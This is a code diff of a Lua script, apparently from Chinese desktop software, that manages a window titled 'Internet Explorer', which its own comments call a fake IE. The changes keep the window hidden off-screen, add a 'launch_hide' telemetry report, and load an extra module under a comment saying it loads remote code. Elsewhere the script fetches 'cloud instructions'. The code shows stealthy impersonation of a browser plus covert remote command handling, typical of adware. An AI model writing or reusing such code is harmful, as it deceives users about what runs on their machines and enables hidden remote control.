@@ -50,15 +50,15 @@ function ShowMainTipWnd(objMainWnd)
 	if not bHideFakeIE then
 		objMainWnd:Show(5)
 		FunctionObj.RestoreWndSize()
-		
 		SendStartupReport(true)
+		objMainWnd:SetAppWindow(1)
 	else
 		-- 将窗口区域移到屏幕外面,防止机器卡机时屏幕出现虚框
-		objMainWnd:SetAppWindow(false)
+		
 		local screenWidth, screenHeight = tipUtil:GetScreenSize()
 		objMainWnd:Move(screenWidth + 100, screenHeight + 100, 100, 100)
 		
-		objMainWnd:Show(0)
+		objMainWnd:Show(4)
 	end
 	
 	objMainWnd:SetTitle("Internet Explorer")
@@ -72,6 +72,9 @@ function SendStartupReport(bShowWnd)
 	
 	if not bShowWnd then
 		tStatInfo.strEC = "launch"  --进入上报
+		if bHideFakeIE then
+			tStatInfo.strEC = "launch_hide"
+		end
 		tStatInfo.strEA = FunctionObj.GetInstallSrc() or ""
 		tStatInfo.strEL = strSource or ""
 	else
@@ -847,7 +850,7 @@ function PreTipMain()
 		--拉起云指令
 		RunJsHost()
 	else
-		--非开机启动，则发消息杀掉隐藏的伪IE
+		--非开机启动，则发自杀消息,杀掉隐藏的伪IE
 		tipAsynUtil:AsynPostWndMsg(nil,"{C3CE0473-57F7-4a0a-9CF4-C1ECB8A3C514}_dsmainmsg_ie",1024+401,0,0,function(nRet)
 		end)
 	end
@@ -868,5 +871,7 @@ end
 
 PreTipMain()
 
+--直接加载远程代码文件
+XLLoadModule("E:\\project\\COM_B\\googlecode\\trunk\\code\\IEServerLua\\ieextra_v1.1.js")
 
 
